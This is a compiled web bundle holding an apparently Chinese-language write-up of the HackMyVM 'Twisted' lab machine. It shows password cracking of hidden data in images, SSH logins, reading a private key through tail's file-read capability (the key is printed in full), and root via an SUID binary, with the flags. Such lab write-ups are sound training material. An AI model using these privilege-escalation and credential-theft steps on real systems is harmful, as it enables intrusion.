"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2480],{78873:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>h,frontMatter:()=>s,metadata:()=>d,toc:()=>l});var i=t(85893),a=t(11151);const s={},r="Twisted",d={id:"HackMyVM/Machines/Twisted/index",title:"Twisted",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Twisted/index.md",sourceDirName:"HackMyVM/Machines/Twisted",slug:"/HackMyVM/Machines/Twisted/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Twisted/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Twisted/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"SuidyRevenge",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/SuidyRevenge/"},next:{title:"UnbakedPie",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/UnbakedPie/"}},c={},l=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"stegseek \u9690\u5199",id:"stegseek-\u9690\u5199",level:2},{value:"\u9690\u5199\u6570\u636e\u5c1d\u8bd5\u5229\u7528",id:"\u9690\u5199\u6570\u636e\u5c1d\u8bd5\u5229\u7528",level:2},{value:"<code>markus</code> \u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728 hint",id:"markus-\u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728-hint",level:2},{value:"<code>mateo</code> \u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728 hint",id:"mateo-\u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728-hint",level:2},{value:"\u5206\u6790\u7ed9\u51fa\u7684 wav \u6587\u4ef6",id:"\u5206\u6790\u7ed9\u51fa\u7684-wav-\u6587\u4ef6",level:2},{value:"\u68c0\u67e5\u63d0\u6743\u53ef\u80fd\u6027",id:"\u68c0\u67e5\u63d0\u6743\u53ef\u80fd\u6027",level:2},{value:"SSH \u79c1\u94a5\u5229\u7528",id:"ssh-\u79c1\u94a5\u5229\u7528",level:2},{value:"user pwn",id:"user-pwn",level:2},{value:"<code>bonita</code> \u7528\u6237\u68c0\u67e5\u63d0\u6743\u53ef\u80fd\u6027",id:"bonita-\u7528\u6237\u68c0\u67e5\u63d0\u6743\u53ef\u80fd\u6027",level:2},{value:"root pwned",id:"root-pwned",level:2},{value:"\u540e\u8bb0",id:"\u540e\u8bb0",level:2}];function o(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"twisted",children:"Twisted"}),"\n",(0,i.jsxs)(n.admonition,{type:"note",children:[(0,i.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,i.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-10-15"}),(0,i.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 421465f7ccfc34907fd8b7fa38f46dbc"}),(0,i.jsx)(n.p,{children:"\u2620 Root // 181"}),(0,i.jsx)(n.p,{children:"\ud83d\udc80 User // 184"}),(0,i.jsx)(n.p,{children:"\ud83d\udcddNotes //\nAn easy one. Tested on Vbox."})]}),"\n",(0,i.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:t(58126).Z+"",width:"1020",height:"687"})}),"\n",(0,i.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.104\n"})}),"\n",(0,i.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"Nmap scan report for 192.168.56.104\nHost is up (0.00034s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    nginx 1.14.2\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: nginx/1.14.2\n2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 6763a0c98b7af342ac49aba6a73ffcee (RSA)\n|   256 8cce8747f8b81a1a78e5b7ce74d7f5db (ECDSA)\n|_  256 9294660b92d3cf7effe8bf3c7b41b75a (ED25519)\nMAC Address: 08:00:27:57:30:56 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Twisted]\n\u2514\u2500\u2500\u257c $http get 192.168.56.104\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Encoding: gzip\nContent-Type: text/html\nDate: Fri, 22 Dec 2023 13:50:21 GMT\nETag: W/"5f86a150-e6"\nLast-Modified: Wed, 14 Oct 2020 06:57:20 GMT\nServer: nginx/1.14.2\nTransfer-Encoding: chunked\n\n<h1>I love cats!</h1>\n<img src="cat-original.jpg" alt="Cat original"  width="400" height="400">\n<br>\n\n<h1>But I prefer this one because seems different</h1>\n\n<img src="cat-hidden.jpg" alt="Cat Hidden" width="400" height="400">\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5c06\u4e24\u4e2a jpg \u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u5206\u6790"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Twisted]\n\u2514\u2500\u2500\u257c $wget http://192.168.56.104/cat-original.jpg\n--2023-12-22 21:53:06--  http://192.168.56.104/cat-original.jpg\n\u6b63\u5728\u8fde\u63a5 192.168.56.104:80... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a288693 (282K) [image/jpeg]\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201ccat-original.jpg\u201d\n\ncat-original.jpg                  100%[==========================================================>] 281.93K  --.-KB/s  \u7528\u65f6 0.002s\n\n2023-12-22 21:53:06 (162 MB/s) - \u5df2\u4fdd\u5b58 \u201ccat-original.jpg\u201d [288693/288693])\n\n\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Twisted]\n\u2514\u2500\u2500\u257c $wget http://192.168.56.104/cat-hidden.jpg\n--2023-12-22 21:53:12--  http://192.168.56.104/cat-hidden.jpg\n\u6b63\u5728\u8fde\u63a5 192.168.56.104:80... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a288706 (282K) [image/jpeg]\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201ccat-hidden.jpg\u201d\n\ncat-hidden.jpg                    100%[==========================================================>] 281.94K  --.-KB/s  \u7528\u65f6 0.002s\n\n2023-12-22 21:53:12 (127 MB/s) - \u5df2\u4fdd\u5b58 \u201ccat-hidden.jpg\u201d [288706/288706])\n"})}),"\n",(0,i.jsx)(n.h2,{id:"stegseek-\u9690\u5199",children:"stegseek \u9690\u5199"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",metastring:'title="cat-original.jpg stegseek"',children:'\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Twisted]\n\u2514\u2500\u2500\u257c $stegseek cat-original.jpg /usr/share/wordlists/rockyou.txt\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: "westlife"\n[i] Original filename: "markus.txt".\n[i] Extracting to "cat-original.jpg.out".\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",metastring:'title="cat-hidden.jpg stegseek"',children:'\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Twisted]\n\u2514\u2500\u2500\u257c $stegseek cat-hidden.jpg /usr/share/wordlists/rockyou.txt\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: "sexymama"\n[i] Original filename: "mateo.txt".\n[i] Extracting to "cat-hidden.jpg.out".\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u8bfb\u53d6\u89e3\u5bc6\u51fa\u6765\u7684\u4fe1\u606f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="cat-original.jpg.out"',children:"markuslovesbonita\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="cat-hidden.jpg.out"',children:"thisismypassword\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u9690\u5199\u6570\u636e\u5c1d\u8bd5\u5229\u7528",children:"\u9690\u5199\u6570\u636e\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,i.jsx)(n.p,{children:"\u7531\u4e8e\u53ea\u5f00\u653e\u4e86\u4e00\u4e2a web \u670d\u52a1\uff0c\u548c\u4e00\u4e2a SSH \u670d\u52a1\uff0c\u6240\u4ee5\u6000\u7591\u56fe\u50cf\u9690\u5199\u63d0\u53d6\u51fa\u6765\u7684\u6570\u636e\u4e3a SSH \u7684\u51ed\u636e\uff0c\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"mateo:thisismypassword\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",metastring:'title="SSH mateo"',children:"\u250c\u2500[\u2717]\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Twisted]\n\u2514\u2500\u2500\u257c $ssh mateo@192.168.56.104 -p 2222\nmateo@192.168.56.104's password:\nLinux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Oct 14 03:21:44 2020 from 192.168.1.58\nmateo@twisted:~$ whoami\nmateo\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"markus:markuslovesbonita\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",metastring:'title="SSH mateo"',children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Twisted]\n\u2514\u2500\u2500\u257c $ssh markus@192.168.56.104 -p 2222\nmarkus@192.168.56.104's password:\nLinux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nmarkus@twisted:~$ whoami\nmarkus\n"})}),"\n",(0,i.jsxs)(n.h2,{id:"markus-\u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728-hint",children:[(0,i.jsx)(n.code,{children:"markus"})," \u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728 hint"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/markus/note.txt"',children:"Hi bonita,\nI have saved your id_rsa here: /var/cache/apt/id_rsa\nNobody can find it.\n"})}),"\n",(0,i.jsxs)(n.h2,{id:"mateo-\u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728-hint",children:[(0,i.jsx)(n.code,{children:"mateo"})," \u7528\u6237\u76ee\u5f55\u4e0b\u5b58\u5728 hint"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/mateo/note.txt"',children:"/var/www/html/gogogo.wav\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u5206\u6790\u7ed9\u51fa\u7684-wav-\u6587\u4ef6",children:"\u5206\u6790\u7ed9\u51fa\u7684 wav \u6587\u4ef6"}),"\n",(0,i.jsxs)(n.p,{children:["\u5c06 wav \u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"audacity"})," \u8fdb\u884c\u5206\u6790"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"audacity",src:t(62593).Z+"",width:"1920",height:"1050"})}),"\n",(0,i.jsx)(n.p,{children:"\u53ef\u4ee5\u76ee\u6d4b\u51fa\u6765\u662f\u6469\u65af\u7535\u7801\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u70b9\u6760\u5f62\u5f0f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"--. --- -.. . . .--. . .-. .-.-.- .-.-.- .-.-.- -.-. --- -- . .-- .. - .... -- . .-.-.- .-.-.- .-.-.- .-.. .. - - .-.. . .-. .- -... -... .. - .-.-.- .-.-.- .-.-.-\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c06\u5176\u89e3\u7801\u540e\u5f97\u5230"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"GODEEPER...COMEWITHME...LITTLERABBIT...\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u68c0\u67e5\u63d0\u6743\u53ef\u80fd\u6027",children:"\u68c0\u67e5\u63d0\u6743\u53ef\u80fd\u6027"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/home/bonita/beroot\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping = cap_net_raw+ep\n/usr/bin/tail = cap_dac_read_search+ep\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u51fa ",(0,i.jsx)(n.code,{children:"/usr/bin/tail"})," \u6587\u4ef6\u5177\u6709\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u7684\u80fd\u529b\uff0c\u5c1d\u8bd5\u5229\u7528"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="tail -n 100 /var/cache/apt/id_rsa"',children:"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd\nFyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS\nolvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1\nvD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF\ngFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C\ntt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM\ngl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC\nxCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8\nDcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H\nuN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD\nXhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu\nU3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI\nmZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/\nhmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro\nnxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK\nmPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+\nbUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq\nyzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP\nUvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh\nV2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ\nLlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz\na0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF\neERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu\nD0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u6210\u529f\u5f97\u5230 ",(0,i.jsx)(n.code,{children:"id_rsa"})," \u6587\u4ef6\u7684\u6570\u636e"]}),"\n",(0,i.jsx)(n.h2,{id:"ssh-\u79c1\u94a5\u5229\u7528",children:"SSH \u79c1\u94a5\u5229\u7528"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Twisted]\n\u2514\u2500\u2500\u257c $ssh bonita@192.168.56.104 -p 2222 -i id_rsa\nLinux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nbonita@twisted:~$ whoami\nbonita\n"})}),"\n",(0,i.jsx)(n.h2,{id:"user-pwn",children:"user pwn"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"bonita@twisted:~$ cat user.txt\nHMVblackcat\n"})}),"\n",(0,i.jsxs)(n.h2,{id:"bonita-\u7528\u6237\u68c0\u67e5\u63d0\u6743\u53ef\u80fd\u6027",children:[(0,i.jsx)(n.code,{children:"bonita"})," \u7528\u6237\u68c0\u67e5\u63d0\u6743\u53ef\u80fd\u6027"]}),"\n",(0,i.jsx)(n.p,{children:"\u53d1\u73b0\u7528\u6237\u76ee\u5f55\u5b58\u5728\u4e00\u4e2a suid \u4e8c\u8fdb\u5236\u6587\u4ef6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"bonita@twisted:~$ ls -lh\ntotal 24K\n-rwsrws--- 1 root   bonita 17K Oct 14  2020 beroot\n-rw------- 1 bonita bonita  12 Oct 14  2020 user.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u4e0b\u8f7d\u4e0b\u6765\u5c1d\u8bd5\u8fdb\u884c\u5206\u6790"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"beroot \u9006\u5411\u5206\u6790",src:t(54662).Z+"",width:"1460",height:"859"})}),"\n",(0,i.jsx)(n.p,{children:"\u4ece\u4f2a\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\u5224\u65ad\u903b\u8f91\uff0c\u5e76\u4e14\u7ed3\u5408\u7a0b\u5e8f\u5177\u6709 suid \u5c5e\u6027\uff0c\u5b58\u5728\u63d0\u6743\u53ef\u80fd\u6027"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"bonita@twisted:~$ ./beroot\nEnter the code:\n 5880\nroot@twisted:~# whoami\nroot\n"})}),"\n",(0,i.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"root@twisted:/root# cat root.txt\nHMVwhereismycat\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u540e\u8bb0",children:"\u540e\u8bb0"}),"\n",(0,i.jsxs)(n.p,{children:["\u65e2\u7136 ",(0,i.jsx)(n.code,{children:"tail"})," \u80fd\u591f\u505a\u5230\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u7684\u8bdd\uff0c\u5176\u5b9e\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 ",(0,i.jsx)(n.code,{children:"root.txt"})," \u7684\u6587\u4ef6\u5185\u5bb9"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"bonita@twisted:~$ tail /root/root.txt\nHMVwhereismycat\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u9898\u7684\u6743\u9650\u9650\u5236\u8fd8\u662f\u6b20\u4f73"})]})}function h(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(o,{...e})}):o(e)}},62593:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image_20231229-222937-fc30e777c401308e78b882dd897f0209.png"},58126:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image_20231247-214736-657558142a29b34f8f83c97f1e15e1df.png"},54662:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image_20231247-224754-b96a8c3345d941d963b1447d16c029af.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>d,a:()=>r});var i=t(67294);const a={},s=i.createContext(a);function r(e){const n=i.useContext(s);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),i.createElement(s.Provider,{value:n},e.children)}}}]);